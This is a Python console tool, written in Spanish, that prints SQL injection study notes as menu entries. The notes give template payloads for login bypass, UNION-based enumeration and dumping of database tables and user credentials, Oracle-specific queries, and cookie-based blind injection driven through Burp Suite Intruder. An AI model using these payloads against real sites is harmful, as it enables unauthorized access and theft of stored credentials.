
#Librerias
import funciones_generales

#Variable global
save_hit_global=""

def menu_interno(numero_seleccion):#Menu para la seleccion despues de cada ataque
    numero_seleccion_int=int(numero_seleccion)
    print()
    print("--------------------------------------------------------------------")
    print("[1] Next:")
    print("[2] Ir al menu de la vulnerabilidad")
    print("[3] si desea ir al menu principal")
    print("--------------------------------------------------------------------")
    seleccion=input("Seleccionar: ")
    if(seleccion=="1"):
        numero_seleccion_int=numero_seleccion_int+1
        numero_seleccion=str(numero_seleccion_int)
        print()
        save_hit_global=numero_seleccion
        funciones_generales.guardar_variable("sql_inyection",save_hit_global)
        content_sql_injection(numero_seleccion)
    if(seleccion=="2"):
        sql_injection_menu()
        print()
    if(seleccion=="3"):
        funciones_generales.menu_principal()
        print()

def content_sql_injection(numero_seleccion):#Contenido de sql injection
    if(numero_seleccion=="con" or numero_seleccion=="CON"):
        print("**********************************************************************************")
        print("CONCEPTS: ")
        print("ESTRCUTURA: |DataBase--> Tables--> Columns--> Data|")
        print("**********************************************************************************")
    elif(numero_seleccion=="dic" or numero_seleccion=="DIC"):
        print("**********************************************************************************")
        print("DICTIONARY: ")
        print("Sanatizada: Código a la cuál se desarrollo para que no se hagan ataques sql injection")
        print("Dumpear: Extraer información.")
        print("bypass or bypassing: Es evitar la autenticación")
        print("Cluster van: Son tablas que estan en un mismo espacio, que se relacionan con una clave primaria. ")
        print("Fusear: Combinar herramientas o tecnicas. ")


        print("**********************************************************************************")

    elif(numero_seleccion=="A" or numero_seleccion=="a"):
        print("**********************************************************************************")
        print("A: ATAQUE GENERAL")
        print()
        print("DESCRIPTION: Es un ataque en general, sin saber cual es la tecnología de data base se está utilizando, y es un resumen de lo que se ha visto.")
        print("--------------------------------------------------------------------------")
        print("EXPLICACIÓN POR PARTES:")
        print("Step #1: ATTACK: Saber cuantas columnas hay HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT null,...,null-- -] ")
        print("Step #2: ATTACK: Saber que bases de datos hay HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT null,...,schema_name from information_schema.schemata-- -] ")
        print("Step #3: ATTACK: Saber que bases de datos hay HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT null,...,schema_name from information_schema.schemata-- -] ")
        print(" Step #3.1: Seleccionamos a la base de datos que deseamos atacar")
        print("Step #4: ATTACK: Enumerar las tablas de la base de datos HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT null,...,table_name FROM information_schema.tables WHERE table_schema ='Nombre_de_la_base_de_datos'-- -] ")
        print(" Step #4.1: Seleccionamos a la tabla que deseamos atacar")
        print("Step #5: ATTACK: Enumerar las columnas HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT null,...,column_name FROM information_schema.columns WHERE table_schema ='Nombre_de_la_base_de_datos' AND table_name='Nombre_de_la_tabla'-- -] ")
        print(" Step #5.1: Seleccionamos a las columnas que deseamos atacar")
        print("Step #6: ATTACK: Ahora vamos a dumpear HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT null,...,column_1 FROM tabla_seleccionada -- -] ")
        print(" Step #6.1: Podemos concatenar los resultados para ver dos columnas:")
        print("     Step #6.1.1: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT null,...,concat(column_1,':',column_2) FROM tabla_seleccionada -- -]")
        print("     Step #6.1.2: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT null,...,concat(column_1||':'||column_2) FROM tabla_seleccionada -- -]")
        print("--------------------------------------------------------------------------")
        print("[']: Es para cerrar la query y hacer un hueco para introducir el ataque malicioso.")
        print("[UNION]: Unir una consulta.")
        print("[-- -]: para comentar la query faltante que quedo de la original. ")
        print("[schema_name FROM information_schema.schemata]: Sirve para listar las bases de datos existentes.")
        print("[table_name FROM information_schema.tables]: Te va a traer los nombres de las tablas de la base de datos.")
        print("[column_name FROM information_schema.columns]: Me va a listar las columnas que tenga una tabla")

        print("**********************************************************************************")

    elif(numero_seleccion=="1"):
        print("**********************************************************************************")
        print("#1: VULNERABILIDAD SQL INJECTION EN LA CLÁUSULA WHERE PARA PERMITIR LA RECUPERACIÓN DE DATOS ESCONDIDOS")
        print()
        print("DESCRIPTION: para ver las partes ocultas de una web.")
        print("--------------------------------------------------------------------------")
        print("EXPLICACIÓN POR PARTES:")
        print("Step #1: ATTACK: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor[' or 1=1 -- -] ")
        print("--------------------------------------------------------------------------")
        print("[']: Es para cerrar la query y hacer un hueco para introducir el ataque malicioso.")
        print("[or]: Condición en la que nos va a servir para decir si esto si cumple O si esto otro cumple.")
        print("[1=1]: Se busca un TRUE por lo cual logicamente 1 es igual a 1.")
        print("[-- -]: para comentar la query faltante que quedo de la original. ")
        print("**********************************************************************************")
        print()
    elif(numero_seleccion=="2"):
        print("**********************************************************************************")
        print("#2: VULNERABILIDAD SQL INJECTION QUE PERMITE EVITAR LOGUEARSE")
        print()
        print("EXPLICACIÓN POR PARTES:")
        print("Step #1: Irse al panel de autentincación.")
        print("Step #2: Nos ubicamos en el textbox donde copiamos el usuario.")
        print("Step #3: ATTACK: copiamos [ << Administrador | Nombre_Del_Usuario >> '--].")
        print("     Remember #1: Si es necesario copiamos cualquier contraseña en el textbox de password.")
        print("--------------------------------------------------------------------------")
        print("[Nombre_Del_Usuario]:Ingresamos el nombre del usuario")
        print("[']: Para hacer un hueco.")
        print("[-- -]: Para comentar las demás partes.")
        print("[<< valor >>]: Es un valor que nosotros ponemos según la situación.")
        print("**********************************************************************************")
        print()
    elif(numero_seleccion=="3"):
        print("**********************************************************************************")
        print("#3: ATAQUE DE UNIÓN DE INYECCIÓN SQL, QUE DETERMINA EL NÚMERO DE COLUMNAS DEVUELTAS POR LA CONSULTA")
        print()
        print("DESCRIPTION: La idea de este ataque es saber las columnas que tiene una tabla.")
        print("--------------------------------------------------------------------------")
        print("EXPLICACIÓN POR PARTES:")
        print("Step #1: Irse a la dirección HTTPS y generar un error para tener indicios que si se pueda hacer: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['] ")
        print(" Result #1: Se debe ver un error")
        print("Step #2: Debemos identificar cuantas columnas debe de tener una tabla, la idea principal es buscar hasta que nos salga un error: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['order by ( << Num >> ) -- -]   ")
        print(" Remember #1: Recordemos que cuando nos sale el error es porque ya hemos llegado al limite.")
        print("Step #5: Conocer el rango de columnas.")
        print("Step #6: Ahora que ya sabemos el numero de columnas vamos a hacer con una instrucción de sql: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT null,...,null-- -]")
        print("Step #7: En los campos de null podemos ejecutar funciones(Ósea en vez de poner null podemos poner la función):")
        print("     Attack #1: Ver versión de SQL: [null,null,version(),null,null]")
        print("     Attack #2: Ver el nombre de la DataBase: [null,null,database(),null,null]")
        print("     Attack #3: Ver cuál es el usuario que esta corriendo la DataBase: [null,null,user(),null,null]")
        print("--------------------------------------------------------------------------")
        print("[']: Para hacer un hueco.")
        print("[order by (Num)]: Ordernar las columnas, (num) número de columnas que tiene la tabla.")
        print("[<< valor >>]: Es un valor que nosotros ponemos según la situación.")
        print("[-- -]: Para comentar las demás partes.")
        print("[UNION]: Unir una consulta.")
        print("**********************************************************************************")
        print()
    elif(numero_seleccion=="4"):
        print("**********************************************************************************")
        print("#4:ATAQUE SQL INJECTION UNION, ENCONTRAR UNA COLUMNA QUE CONTENGA TEXTO")
        print()
        print("DESCRIPTION: La idea con este ataque es ver que columnas puede contener un string, ya que no todas las columnas permiten strings")
        print("--------------------------------------------------------------------------")
        print("EXPLICACIÓN POR PARTES:")
        print("Step #1: Hacemos un UNION SELECT con Null: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,NULL,NULL-- -]")
        print(" Remember #1: Se debe saber el límite de columnas.")
        print("Step #2: Probamos por cada columna el string para saber donde se puede hacer la sql inyection: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,' << String >> ',NULL-- -]")
        print("--------------------------------------------------------------------------")
        print("[']: Para hacer un hueco.")
        print("[UNION]: Unir una consulta.")
        print("[<< valor >>]: Es un valor que nosotros ponemos según la situación.")
        print("[-- -]: Para comentar las demás partes.")
        print("**********************************************************************************")
        print()
    elif(numero_seleccion=="5"):
        print("**********************************************************************************")
        print("#5: SQL INJECTION CON ATAQUE UNION, RECUPERANDO DATOS DE OTRAS TABLAS")
        print()
        print("EXPLICACIÓN POR PARTES:")
        print("Step #1: Conocer el número de columnas: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,...,NULL -- -].")
        print("     Remember #1: Debemos incrementar o diminuir los NULL para saber cual es el rango.")
        print("Step #2: Ahora debemos saber cuál es la columna que es inyectable: Probamos por cada columna el string para saber donde se puede hacer la sql inyection: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,' << String >> ',NULL-- -]")
        print("     Remember #1: Debemos hacer la prueba por cada columna.")
        print("Step #3: Ahora vamos a ver las bases de datos que hay: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT schema_name,NULL FROM information_schema.schemata-- -]")
        print("     Remember #1: El resultado lo tenremos que buscar en el contenido de la página (Habrán señales)")
        print("Step #4: Ahora vamos a conocer cuales son las tablas que tiene cada database: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,...,table_name FROM information_schema.tables where table_schema=' << Nom_de_la_tabla >>'-- -]")
        print("Step #5: Ahora vamos a conocer cuales son las columnas que tiene las tablas: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,....,column_name FROM information_schema.columns where table_schema=' << Database >>' and table_name=' << Nom_de_la_tabla >>'-- -]")
        print("Step #6: Vamos a ver los contenidos que tiene las columnas: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT << Column_1 >> , << Column_2 >> FROM << Nom_de_la_tabla >> -- -] ")
        print("     Step #6.1: Si queremos concatenar dos columnas para que se vea bien la información")
        print("         Step #6.1.1: Para Oracle y postgreSQL: '<< column_A >> '||' << Column_B >> ' ")
        print("         Step #6.1.2: Para Microsoft: ' << column_A >> '+' << Column_B >> ' ")
        print("         Step #6.1.3: Para mysql: ' << column_A >> ' ' << Column_B >> ' [Tenga en cuenta el espacio entre los dos strings] CONCAT(' << column_a >> ',' << column_b >> ')")
        print("Step #7: Una vez veamos los usuarios podremos ir a ver si podremos ingresar al login")
        print("**********************************************************************************")
        print("[']: Para hacer un hueco.")
        print("[UNION]: Unir una consulta.")
        print("[-- -]: Para comentar las demás partes.")
        print("[<< valor >>]: Es un valor que nosotros ponemos según la situación.")
        print("[schema_name FROM information_schema.schemata]: Sirve para listar las bases de datos existentes.")
        print("[table_name FROM information_schema.tables]: Te va a traer los nombres de las tablas de la base de datos.")
        print("[column_name FROM information_schema.columns]: Me va a listar las columnas que tenga una tabla")
        print()
    elif(numero_seleccion=="6"):
        print("**********************************************************************************")
        print("#6: ATAQUE SQL INJECTION, CONSULTANDO EL TIPO DE BASE DE DATOS Y LA VERSIÓN EN ORACLE")
        print()
        print("Step #Extra 1: Vamos a probar con la tabla DUAL cuantas columnas existen: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,....,NULL FROM dual-- -]")
        print("Step #1: Vamos a probar con la tabla DUAL cuantas columnas existen: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,....,banner FROM v$version-- -]")
        print("     Form #2: Vamos a probar con la tabla DUAL cuantas columnas existen: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,....,version FROM v$instance- -]")
        print("         Remember #1: Recordemos que cuando que cuando nos sale el error es porque ya hemos llegado al limite.")
        print("--------------------------------------------------------------------------")
        print("EXPLICACIÓN POR PARTES:")
        print("[']: Para hacer un hueco.")
        print("[UNION]: Unir una consulta.")
        print("[FROM dual]: Es una tabla predefinida de oracle que solo tiene una columna")
        print("[banner FROM v$version]: Tabla donde se contiene la versión de la base de datos")
        print("[-- -]: Para comentar las demás partes.")
        print("**********************************************************************************")
        print()
    elif(numero_seleccion=="7"):
        print("**********************************************************************************")
        print("#7: OBTENER LA VERSIÓN Y LA DATABASE EN MYSQL Y MICROSOFT")
        print()
        print("DESCRIPTION: Si observamos la sintaxis que hay en mysql es similar a la de microsoft")
        print("--------------------------------------------------------------------------")
        print("EXPLICACIÓN POR PARTES:")
        print("Step #1: Observamos cuantas columnas tiene HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,....,NULL-- -]")
        print(" Remember #1: Recordemos que cuando que cuando nos sale el error es porque ya hemos llegado al limite.")
        print("Step #2: Filtramos por una columna la versión HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,...,@version-- -]")        
        print("--------------------------------------------------------------------------")
        print("EXPLICACIÓN POR PARTES:")
        print("[']: Para hacer un hueco.")
        print("[UNION]: Unir una consulta.")
        print("[@version]: Ver version de la base de datos en microsoft como para mysql.")
        print("[--]: Para comentar las demás partes.")
        print("**********************************************************************************")
    elif(numero_seleccion=="8"):
        print("**********************************************************************************")
        print("#8: ATAQUE SQL INJECTION, ESCUCHANDO CONTENIDO DE LA BASE DE DATOS QUE NO SEA EN ORACLE")
        print()
        print("Step #1: Observamos cuantas columnas tiene HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,....,NULL-- -]")
        print(" Remember #1: Recordemos que cuando nos sale el error es porque ya hemos llegado al limite.")
        print("Step #2: Observamos cuáles bases de datos tiene HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,...,schema_name FROM information_schema.schemata-- -]")
        print(" Step #2.1: Seleccionamos a la base de datos que deseamos atacar")
        print("Step #3: Observamos las tablas que tiene una base de datos en especifico HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,...,table_name from information_schema.tables WHERE table_schema=' << Table_name >> '-- -]")
        print(" Step #3.1: Seleccionamos a la tabla que deseamos atacar")
        print("Step #4: Vemos las columnas que se requiera ver HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,..., << column_1 >> ||':'|| << column_2 >> from table_name]")
        print()
        print("--------------------------------------------------------------------------")
        print("EXPLICACIÓN POR PARTES:")
        print("[']: Para hacer un hueco.")
        print("[UNION]: Unir una consulta.")
        print("[schema_name]: Se reucperará los nombres de los esquemas.")
        print("[information_schema]: Es una base de datos del sistema que almacena metadatos")
        print("[.schemata]: Es una vista de la base de datos information_schema")
        print("[<< valor >>]: Es un valor que nosotros ponemos según la situación.")
        print("[--]: Para comentar las demás partes.")
        print("[column1||':'||column2]:Tuberias que concatenan dos columnas")
        print("**********************************************************************************")
    elif(numero_seleccion=="9"):
        print("**********************************************************************************")
        print("#9: ATAQUE DE SQL INJECTION, ESCUCHAR LA BASE DE DATOS CONTENIDA EN ORACLE")
        print()
        print("Step #1: Hacemos el siguiente ataque origen para saber si tiene la vulnerabilidad de sql injection HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['OR 1=1-- -] ")
        print("Step #2: Conocer cuantas columnas tiene la tabla HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,....,NULL-- -] ")
        print(" Form #1: Si nuestra base de datos es oracle entonces lo utilizamos con la tabla dual  HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,....,NULL FROM dual-- -] ")
        print("     Remember #1: Recordemos que cuando que cuando nos sale el error es porque ya hemos llegado al limite.")
        print("Step #3: Ahora vamos a ver todas las tablas que existen en todas las bases de datos existentes HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,....,Table_name FROM all_tables-- -] ")
        print("Step #4: Ahora veremos que propetarios existen HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,...,owner FROM all_tables-- -] ")
        print("Step #5: Ahora vamos a filtrar la información de que tablas tiene en su poder un propetario en especifico HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,...,Table_name FROM all_tables WHERE owner=' << Nombre_del_propetario >> '-- -] ")
        print("Step #6: Una vez conocido el nombre de la tabla que queremos ver, ahora vamos a ver sus columnas HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,...,column_name FROM all_tab_columns WHERE table_name=' << nombre_de_la_tabla >> '-- -] ")
        print("Step #7: Ahora veremos que usuarios existen y cuales son sus correspondientes contraseñas(Los datos) HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,..., << column_1 >> ||':'|| << column_2 >> FROM << Nombre_de_la_tabla >> -- -] ")
        print("--------------------------------------------------------------------------")
        print("EXPLICACIÓN POR PARTES:")
        print("[']: Para hacer un hueco.")
        print("[1=1]: Se busca un TRUE por lo cual logicamente 1 es igual a 1.")
        print("[UNION]: Unir una consulta.")
        print("[-- -]: Para comentar las demás partes.")
        print("[Table_name FROM all_tables]: Ver todas las tablas de todas las bases de datos.")
        print("[owner]:Propetarios.")
        print("[<< valor >>]: Es un valor que nosotros ponemos según la situación.")
        print("[column_name FROM all_tab_columns]:Dumpear las columnas")
        print("**********************************************************************************")
    elif(numero_seleccion=="10"):
        print("**********************************************************************************")        
        print("#10: INYECCIÓN SQL A CIEGAS CON RESPUESTAS CONDICIONALES ")
        print()
        print("Step #1: Haremos un error intencional, solo poninendo una comilla HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['] ")
        print(" result #1: Debe desaparecer el contenido de la página.")
        print("Step #2: Hacemos el ataque origen para saber si tiene una vulnerabilidad sql injection HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['OR 1=1-- -] ")
        print(" result #1: Debe desaparecer el contenido de la página.")
        print("Step #3: Ahora una consulta para saber cuantas columnas tiene HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,....,NULL-- -] ")
        print("Step #3: Ingersamos una función database() HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,....,database()-- -] ")
        print(" result #1: Debe desaparecer el contenido de la página.")
        print("Step #4: Deberemos encontrar una cookie vulnerable, por lo cuál hay que utiliza brup suite ya configurado.")
        print("Step #5: Brup suite:")
        print(" Step #5.1: Interceptamos petición y recargamos la página.")
        print(" Step #5.2: Mandamos la petición al repeater (Ctrl+R).")
        print(" Step #5.3: A la pestaña de response vamos a modificarlo a render para que me muestre la página tal cuál como se ve en los navegadores.")
        print(" Step #5.4: Nos fijamos en la cookie que vamos a vulnerar.")
        print(" Step #5.5: Añadimos un hueco al valor de la cookie--> COOKIE: cookie_de_la_pagina_1[']")
        print(" result #1: Debe desaparecer algo de la página, puede ser muy pequeña.")
        print(" Step #5.6: Añadimos un hueco y ponemos las partes para comentar al valor de la cookie--> COOKIE: cookie_de_la_pagina_1[' -- -]")
        print(" result #1: Debe aparecer el elemento que se nos perdio anteriormente.")
        print(" Step #5.7: Utilizamos un ataque origen al valor de la cookie--> COOKIE: cookie_de_la_pagina_1['AND 1=1 -- -]")
        print(" result #1: Debe aparecer el elemento que se nos perdio anteriormente o debe seguir apareciendo este elemento.")
        print(" Step #5.8: Utilizamos un ataque origen al valor pero de una forma que me salga un False de la cookie--> COOKIE: cookie_de_la_pagina_1['AND 2=1 -- -]")
        print(" result #1: Esto me debe desaparecer el elemento clave.")
        print(" Step #5.9: Verificamos si hay un usuario llamado administrator--> COOKIE: cookie_de_la_pagina_1['AND (SELECT 'a' FROM << nombre_de_la_tabla >> where << columna_1 >> =' << administrator >> ')=' << a | Letra >> -- -]")
        print(" Form #1: Usar la función substring() --> COOKIE: cookie_de_la_pagina_1['AND (SELECT substring( << columna_1 >> , 1 ,1) FROM << nombre_de_la_tabla >> where << columna_1 | Columna_usuarios >> =' << administrator >> ')='a -- -] ")
        print(" Form #2: Usar la función substring() pero para verificar la segunda letra--> COOKIE: cookie_de_la_pagina_1['AND (SELECT substring( << columna_1 | Columna_usuarios >> , 2 ,1) FROM << nombre_de_la_tabla | Tabla_usuarios >> where << columna_1 | Columna_usuarios >> =' << administrator >> ')=' << a | Letra >>  -- -] ")
        print("     result #1: Si sigue apareciendo el elemento clave, es por que si existe un usuario llamado administrator")
        print(" Step #5.10: Nos dirigimos al burp suite en el apartado de request y nos vamos al intruder(Ctrl+i), nos dirigimos a la segunda pestaña, después a la pestaña positions.")
        print(" Step #5.11: Seleccionamos el ataque Sniper, después damos clic en clear.")
        print(" Step #5.12: Vamos a fusear el primer elemento, nos ubicamos en la parte [=' << a | Letra >> ] y seleccionamos [a]]")
        print(" Step #5.13: Después damos al botón de add")
        print("     result #1: se nos agregara unas llaves[{"+"}]")
        print(" Step #5.14: Nos dirigimos a la pestaña de payloads")
        print(" Step #5.15: Creamos un diccionario con el textbox que hay y el botón de add")
        print(" Step #5.16: Nos dirigimos a la pestaña proxy, después a payloads y damos clic en start attack")
        print("     result #1: Nos fijaremos en la columna de lenght, ya que debemos analizar el tamaño, cuando hay un patrón que no se repita tanto, este puede ser el correcto en la posición.")
        print("Step #6: Python:")
        print(" Step #6.1: Instalar las siguientes librerias y herramientas:")
        print("     [pip3 install pwntools]: Barras de progreso.")
        print(" Step #6.2: Crear Script(Esta comentado uno por uno):")
        print("     Step #6.2.1: Burp suite: ")
        print("         Step #6.2.1.1: Encontrar la url principal nos vamos a: pestaña raw/host:[url principal(copiar)]")
        print("         Step #6.2.1.2: Encontrar la longitud de la contraseña: \n \t\t COOKIE: cookie_de_la_pagina_1= VALORES_RANDOM_1 \n \t\t ['and (SELECT ' << a | Letra >>' \n \t\t FROM << users | nombre_de_la_tabla >> \n \t\t WHERE << username | Column_name >> =' << administrator | valor_1  >>' and length( << Column_password | Column_name >> )>= << numero_valor(int) >> ) ' << a | letra_valor(string) >> ; ] ")
        print("             Remember #1: Intentamos enontrar el numero limite de la longitud de la contraseña, esto se hace teniendo en cuenta el elemento que se pierde y aparece. ")
        print("         Step #6.2.1.3: vamos a copiar la cookie completa donde está el burp suite: \n \t\t (desde) Cookie_1= VALOR_RANDOM_1 \n \t\t [' AND (SELECT substring( << Column_password >> ,1,1)  \n \t\t FORM << Table_users | Table_name >> \n \t\t WHERE << Column_username | Column_name >>= ' << administrador | valor_string >> ' )= ' << valor_letra | a(string) >> ; \n  \t\t Cookie_2= VALOR_RANDOM_2(hasta)] ")
        print("         Step #6.2.1.4: vamos a a separar las cookies para que no queden tan juntas, solo es darle espacio despues de la coma ['<< valor_letra >>''],")
        







        print("--------------------------------------------------------------------------")
        print("EXPLICACIÓN POR PARTES:")
        print("[']: Para hacer un hueco.")
        print("[1=1]: Se busca un TRUE por lo cual logicamente 1 es igual a 1.")
        print("[--]: Para comentar las demás partes.")
        print("[LIMIT #]: Me ayuda a limitar los registros de una consulta.")
        print("[substring(1,1)]: Seleccionamos la primera letra del resultado de la consulta.")
        print("[''valor'']: Cuando pongo '' es porque se refiere a comillas dobles("").")
        print("[<<valor>>]: Es un valor que nosotros ponemos según la situación.")
        print("[VALORES_RANDOM_numero]: Es un valor que random que nos da la página a la que queremos atacar.")
        print("**********************************************************************************")
        
    else:#Sino tenemos más ataques
        print("--------------------------------------------------------------------")
        print("Not more attacks")#Mostramos este mensaje
        print("--------------------------------------------------------------------")
        print()
        sql_injection_menu()#Volvemos al menu
        
    menu_interno(numero_seleccion)

def sql_injection_menu():#Menu interactivo del ataque de sql inyections
    print()
    print("         SQL inyection           ")
    print("             HITS                ")
    print("█████████████████████████████████")
    print("OPTION [CON]: CONCEPTOS")
    print("OPTION [DIC]: DICCIONARIO")
    print("OPTION [A]: ATAQUE GENERAL")
    print("HIT #1: VULNERABILIDAD SQL INJECTION EN LA CLÁUSULA WHERE PARA PERMITIR LA RECUPERACIÓN DE DATOS ESCONDIDOS")
    print("HIT #2: VULNERABILIDAD SQL INJECTION QUE PERMITE EVITAR LOGUEARSE")
    print("HIT #3: ATAQUE DE UNIÓN DE INYECCIÓN SQL, QUE DETERMINA EL NÚMERO DE COLUMNAS DEVUELTAS POR LA CONSULTA")
    print("HIT #4: ATAQUE SQL INJECTION UNION, ENCONTRAR UNA COLUMNA QUE CONTENGA TEXTO")
    print("HIT #5: SQL INJECTION CON ATAQUE UNION, RECUPERANDO DATOS DE OTRAS TABLAS")
    print("HIT #6: ATAQUE SQL INJECTION, CONSULTANDO EL TIPO DE BASE DE DATOS Y LA VERSIÓN EN ORACLE")
    print("HIT #7: OBTENER LA VERSIÓN Y LA DATABASE EN MYSQL Y MICROSOFT")
    print("HIT #8: ATAQUE SQL INJECTION, ESCUCHANDO CONTENIDO DE LA BASE DE DATOS QUE NO SEA EN ORACLE")
    print("HIT #9: ATAQUE DE SQL INJECTION, ESCUCHAR LA BASE DE DATOS CONTENIDA EN ORACLE")
    print("HIT #10:  INYECCIÓN SQL A CIEGAS CON RESPUESTAS CONDICIONALES ")
    
    print("█████████████████████████████████")
    numero_seleccion=input("select number of the attack: ")
    print()
    save_hit_global=numero_seleccion
    funciones_generales.guardar_variable("sql_inyection",save_hit_global)
    content_sql_injection(numero_seleccion)
    
